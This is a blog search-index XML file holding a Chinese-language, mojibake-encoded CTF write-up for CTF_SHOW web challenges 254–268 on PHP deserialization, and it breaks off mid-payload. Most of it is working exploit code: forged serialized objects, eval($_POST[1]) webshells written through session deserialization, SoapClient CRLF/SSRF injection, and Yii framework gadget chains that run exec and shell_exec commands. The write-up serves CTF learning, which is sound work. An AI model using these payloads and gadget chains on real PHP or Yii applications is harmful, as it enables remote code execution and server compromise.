<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF_SHOWä¹‹webå…¥é—¨ååºåˆ—åŒ–éƒ¨åˆ†wp</title>
      <link href="/2022/03/23/jian-web-fan-xu-lie-hua/"/>
      <url>/2022/03/23/jian-web-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><p>åªéœ€é€šè¿‡getä¼ å‚å°†usernameå’Œpasswordèµ‹å€¼ä¸ºxxxxxxå³å¯</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*\# -*- coding: utf-8 -*-\# @Author: h1xa\# @Date:  2020-12-02 17:44:47\# @Last Modified by:  h1xa\# @Last Modified time: 2020-12-02 19:29:02\# @email: h1xa@ctfer.com\# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;  public $username&#x3D;&#39;xxxxxx&#39;;  public $password&#x3D;&#39;xxxxxx&#39;;  public $isVip&#x3D;false;  public function checkVip()&#123;    return $this-&gt;isVip;  &#125;  public function login($u,$p)&#123;    return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;  &#125;  public function vipOneKeyGetFlag()&#123;    if($this-&gt;isVip)&#123;      global $flag;      echo &quot;your flag is &quot;.$flag;    &#125;else&#123;      echo &quot;no vip, no flag&quot;;    &#125;  &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;  $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    if($user-&gt;login($username,$password))&#123;    if($user-&gt;checkVip())&#123;      $user-&gt;vipOneKeyGetFlag();    &#125;  &#125;else&#123;    echo &quot;no vip,no flag&quot;;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡cookieå°†useråºåˆ—åŒ–åçš„å€¼ä¼ å…¥ï¼ŒåŒæ—¶å°†usernameå’Œpasswordèµ‹å€¼ä¸ºxxxxxxå³å¯</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;  public $isVip &#x3D; true;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));urlï¼šhttp:&#x2F;&#x2F;3e8f11f0-0df8-4e12-8f12-9da9900504df.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡éœ€è¦å°†getä¼ å‚çš„passwordä¸usernameå€¼ä¸cookieåºåˆ—åŒ–usernameä¸passwordçš„å€¼ç›¸ç­‰ï¼Œä½†usernameä¸passwordçš„å€¼åˆä¸èƒ½ç›¸åŒï¼Œè€Œ!==åˆä¸ºå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥åœ¨åé¢æ·»åŠ æ•°å­—å³å¯</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;public $isVip &#x3D; true;public $password &#x3D; &#39;xxxxxx1&#39;;public $username &#x3D; &#39;xxxxxx&#39;;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));urlï¼šhttp:&#x2F;&#x2F;9292eade-bbdb-49e1-a88b-03d2b9e8c687.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    $user-&gt;login($username,$password);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°åœ¨ctfShowUserç±»ä¸­æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__constructï¼Œè°ƒç”¨è¯¥ç±»æ—¶ä¼šè‡ªåŠ¨è§¦å‘è¯¥é­”æœ¯æ–¹æ³•ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»ºinfoç±»çš„å®ä¾‹ï¼Œè€Œåœ¨backDoorç±»ä¸­åˆæœ‰evalå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨__constructæ–¹æ³•ä¸­å°†info()ï¼Œæ”¹ä¸ºbackDoorå³å¯ï¼Œ</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new backDoor();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code&#x3D;&#39;eval($_POST[1]);&#39;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));urlï¼šhttp:&#x2F;&#x2F;ba363cdc-e1b2-49e4-bfbb-29aa388b2285.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxxpsot:1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h4><pre class="line-numbers language-none"><code class="language-none">if(isset($username) &amp;&amp; isset($password))&#123;  if(!preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $_COOKIE[&#39;user&#39;]))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);  &#125;  $user-&gt;login($username,$password);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡å¯¹userå¢åŠ äº†è¿‡æ»¤ï¼Œå³ä¸èƒ½åŒ¹é…åˆ°o:æ•°å­—</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨æ•°å­—å‰åŠ ä¸Šï¼‹å·å³å¯</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;  public $username&#x3D;&#39;xxxxxx&#39;;  public $password&#x3D;&#39;xxxxxx&#39;;  public $isVip&#x3D;false;  public $class &#x3D; &#39;info&#39;;  public function __construct()&#123;â€‹    $this-&gt;class&#x3D;new backDoor();  &#125;  public function login($u,$p)&#123;â€‹    return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;  &#125;  public function __destruct()&#123;â€‹    $this-&gt;class-&gt;getInfo();  &#125;&#125;class info&#123;  public $user&#x3D;&#39;xxxxxx&#39;;  public function getInfo()&#123;â€‹    return $this-&gt;user;  &#125;&#125;class backDoor&#123;  public $code&#x3D;&#39;eval($_POST[1]);&#39;;  public function getInfo()&#123;â€‹    eval($this-&gt;code);  &#125;&#125;$user &#x3D; new ctfShowUser();$a &#x3D; serialize($user);$b &#x3D; str_replace(&quot;:11&quot;,&quot;:+11&quot;,$a);$c &#x3D; str_replace(&quot;:8&quot;,&quot;:+8&quot;,$b);echo urlencode($c);url:http:&#x2F;&#x2F;b2b85509-d640-45dd-9d06-74f6a013b0a6.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxxpost1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$vip &#x3D; unserialize($_GET[&#39;vip&#39;]);&#x2F;&#x2F;vip can get flag one key$vip-&gt;getFlag();Notice: Undefined index: vip in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 6Fatal error: Uncaught Error: Call to a member function getFlag() on bool in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:8 Stack trace: #0 &#123;main&#125; thrown in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†æ¬¡æ¥åˆ°æ–°çš„çŸ¥è¯†ç‚¹ï¼Œçœ‹ç¾¤ä¸»è§†é¢‘ï¼Œåœ¨æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼š</p><p>SoapClientç±» __call é­”æœ¯æ–¹æ³•</p><p>__call() é­”æœ¯æ–¹æ³•ï¼šå½“è°ƒç”¨ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</p><p>å½“è°ƒç”¨ SoapClient ç±»çš„ __call() é­”æœ¯æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°ç”±ç€ SoapClient ç±»çš„ä¸€äº›å‚æ•°å†³å®šã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$ua &#x3D; &quot;ctfshow\r\nContent-Type:application&#x2F;x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken&#x3D;ctfshow&quot;;$client &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;&#39;,&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;ctfshow&#39;,&#39;user_agent&#39;&#x3D;&gt;$ua));$client-&gt;getFlag();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_259.png"></p><p>é‚£ä¹ˆå†æ ¹æ®ç»™å‡ºçš„flag.phpè¿›è¡Œä¿®æ”¹å³å¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$ua &#x3D; &quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application&#x2F;x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken&#x3D;ctfshow&quot;;$client &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;,&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;,&#39;user_agent&#39;&#x3D;&gt;$ua));echo urlencode(serialize($client));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);if(preg_match(&#39;&#x2F;ctfshow_i_love_36D&#x2F;&#39;,serialize($_GET[&#39;ctfshow&#39;])))&#123;  echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥å°†ctfhsowèµ‹å€¼ä¸ºctfshow_i_love_36D</p><p>æ‹¿åˆ°flag</p><h4 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h4><p>ä¸æ˜¯å¾ˆæ˜ç™½ï¼Œå…ˆè·³è¿‡</p><h4 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h4><p>åœ¨æ³¨é‡Šä¸­å‘ç°message.phpï¼Œè®¿é—®ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;highlight_file(__FILE__);include(&#39;flag.php&#39;);class message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;if(isset($_COOKIE[&#39;msg&#39;]))&#123;    $msg &#x3D; unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆåªéœ€è¦æ„é€ expå³å¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass message&#123;    public $token&#x3D;&#39;admin&#39;;&#125;$a &#x3D; new message();echo base64_encode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h4><p>å¼„äº†åŠå¤©ä¹Ÿä¸çŸ¥é“å’‹å¼„ï¼Œå°±åˆåªèƒ½å…ˆå»çœ‹ç¾¤ä¸»ç»™çš„è§†é¢‘ï¼Œè¯´æ˜¯æœ‰æºç æç¤ºï¼Œ<a href="http://www.zip,ä¸‹è½½ä¸‹æ¥å,åº”è¯¥æ˜¯sessionååºåˆ—åŒ–/">www.zipï¼Œä¸‹è½½ä¸‹æ¥åï¼Œåº”è¯¥æ˜¯sessionååºåˆ—åŒ–</a></p><pre class="line-numbers language-none"><code class="language-none">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°åœ¨ç™»å½•æ¡†ä¸­ç”¨åˆ°äº†file_put_content()å‡½æ•°ï¼Œè€Œusernameå’Œpasswordæˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™å…¥è‡ªå·±çš„ğŸï¼Œexpï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpsession_start();class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status&#x3D;$s;    &#125; &#125;$a &#x3D;  new User(&#39;1.php&#39;,&#39;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#39;);echo base64_encode(&quot;|&quot;.serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹cookieä¸­limitçš„å€¼ï¼Œè®¿é—®ç™»å½•æ¡†</p><p><img src="/images/web_263a.png"></p><p>ç„¶åå†è®¿é—®check.php</p><p><img src="/images/web_263b.png"></p><p>ç„¶åå†è®¿é—®log-1.php</p><p><img src="/images/web_263c.png"></p><p>ç„¶åå†ç›´æ¥é€šè¿‡postçš„æ–¹å¼è¿›è¡Œæ‰§è¡Œå‘½ä»¤å³å¯æ‹¿åˆ°flag</p><h4 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h4><p>åˆæ˜¯å­—ç¬¦é€ƒé€¸ï¼Œç›´æ¥ä¸Špayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;function filter($msg)&#123;    return $msg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, $msg);&#125;$msg1 &#x3D; new message(&#39;a&#39;,&#39;b&#39;,&#39;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;);$a &#x3D; serialize($msg1);$b &#x3D; filter($a);echo $b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå†è®¿é—®messag.phpå¹¶åœ¨cookieä¸­æ·»åŠ msgçš„å€¼ï¼Œå³å¯æ‹¿åˆ°flag</p><h4 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);include(&#39;flag.php&#39;);highlight_file(__FILE__);class ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token&#x3D;$t;        $this-&gt;password &#x3D; $p;    &#125;    public function login()&#123;        return $this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;&#125;$ctfshow &#x3D; unserialize($_GET[&#39;ctfshow&#39;]);$ctfshow-&gt;token&#x3D;md5(mt_rand());if($ctfshow-&gt;login())&#123;    echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥ä¸Šexp</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfshowAdmin&#123;    public $token &#x3D; &quot;vip&quot;;    public $password &#x3D; &quot;vip&quot;;&#125;$a &#x3D; new ctfshowAdmin();$a-&gt;password &#x3D;&amp; $a-&gt;token;echo urlencode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);$cs &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);class ctfshow&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public function __construct($u,$p)&#123;        $this-&gt;username&#x3D;$u;        $this-&gt;password&#x3D;$p;    &#125;    public function login()&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;    public function __toString()&#123;        return $this-&gt;username;    &#125;    public function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;$ctfshowo&#x3D;@unserialize($cs);if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $cs))&#123;    throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾çš„æ˜¯éœ€è¦æˆ‘ä»¬æ‰§è¡Œ__destructé­”æœ¯æ–¹æ³•ï¼Œä½†åˆè¦ç»•è¿‡æŠ¥é”™æ–¹æ³•ï¼ˆå¯ä»¥åˆ©ç”¨ç ´ç¯åºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸ç ´åç±»åï¼Œè¿™æ ·å®ƒè™½ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šæ­£å¸¸çš„æ‰§è¡Œæ‘§æ¯æ–¹æ³•ï¼‰,payload:</p><pre class="line-numbers language-none"><code class="language-none">post:O:7:&quot;ctfshow&quot;:2:&#123;jian&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”¨bpæäº¤ï¼Œæ‹¿åˆ°flag</p><h4 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h4><p>å†æ¬¡å°¬ä½äº†ï¼Œç¿»äº†åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°çªç ´å£ï¼Œç»§ç»­çœ‹äº†ç¾¤ä¸»ç»™çš„wpè§†é¢‘ï¼Œï¼Œå…ˆç”¨å¼±å£ä»¤ç™»å½•è¿›å»ï¼Œç„¶åæŸ¥çœ‹æºç ï¼Œå‘ç°?view-sourceå’Œæ˜¯yiiæ¡†æ¶ï¼Œåœ¨urlååŠ ä¸Š&amp;view-sourceï¼Œå‡ºç°</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;backdoor&#x2F;shellunserialize(base64_decode($_GET[&#39;code&#39;]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åç›´æ¥ç”¨ç»™å‡ºçš„é“¾å­ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess &#x3D; &#39;exec&#39;;            $this-&gt;id &#x3D; &#39;cp &#x2F;flag &#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web&#x2F;1.txt&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#39;close&#39;] &#x3D; [new CreateAction, &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader &#x3D; new Generator;        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†è®¿é—®1.txt,æ‹¿åˆ°flag</p><h4 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h4><p>è¿™é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†flagï¼Œæ¢ä¸ªé“¾å­ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest &#123;    class Action    &#123;        public $checkAccess;    &#125;    class IndexAction    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;checkAccess &#x3D; $func;            $this-&gt;id &#x3D; $param;        &#125;    &#125;&#125;namespace yii\web &#123;    abstract class MultiFieldSession    &#123;        public $writeCallback;    &#125;    class DbSession extends MultiFieldSession    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];        &#125;    &#125;&#125;namespace yii\db &#123;    use yii\base\BaseObject;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct($func, $param)        &#123;            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);        &#125;    &#125;&#125;namespace &#123;    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &quot;echo &#39;&lt;?php 